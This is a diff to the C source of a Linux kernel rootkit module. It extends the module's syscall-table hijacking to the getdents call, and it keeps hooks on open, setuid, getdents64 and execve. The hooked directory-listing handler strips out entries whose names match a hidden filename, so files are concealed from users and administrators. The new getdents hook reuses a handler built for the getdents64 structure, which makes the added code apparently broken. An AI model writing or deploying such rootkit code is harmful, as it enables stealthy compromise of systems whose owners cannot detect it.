@@ -47,8 +47,9 @@ int __NR_myexecve;
 
 /* Hacked Syscall Pointers */
 
-asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
 asmlinkage int (*orig_open)(const char *, int, mode_t);
+asmlinkage int (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
+asmlinkage int (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int);
 asmlinkage int (*orig_setuid)(uid_t);
 asmlinkage int (*orig_execve)(const char *, const char *[], const char *[]);
 
@@ -125,7 +126,6 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, u
 		while (t > 0){
 			n = dirp3->d_reclen;
 			t -= n;
-			int i;
 			if(strstr((char*) &(dirp3->d_name), hide_file) != NULL){
 				if (t != 0){
 					memmove(dirp3, (char *) dirp3 + dirp3->d_reclen,t);
@@ -177,6 +177,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	orig_open = (void *)xchg(&system_call_table[__NR_open],hacked_open); // Replace open with hacked open
 	orig_getdents64 = (void *)xchg(&system_call_table[__NR_getdents64],hacked_getdents64); // Replace getdents64 with hacked getdents64
+        orig_getdents = (void *)xchg(&system_call_table[__NR_getdents],hacked_getdents64); // Replace getdents64 with hacked getdents64
 	#if defined(__NR_setuid32)
 	orig_setuid = (void *)xchg(&system_call_table[__NR_setuid32],hacked_setuid);
 	#else
@@ -204,6 +205,7 @@ void rootkit_exit(void) {
 
 	xchg(&system_call_table[__NR_open],orig_open); // Replace hacked open with original
 	xchg(&system_call_table[__NR_getdents64],orig_getdents64); // Replace hacked getdents64 with original
+	xchg(&system_call_table[__NR_getdents],orig_getdents); // Replace hacked getdents64 with original
 	#if defined(__NR_setuid32)
 	xchg(&system_call_table[__NR_setuid32],orig_setuid);
 	#else
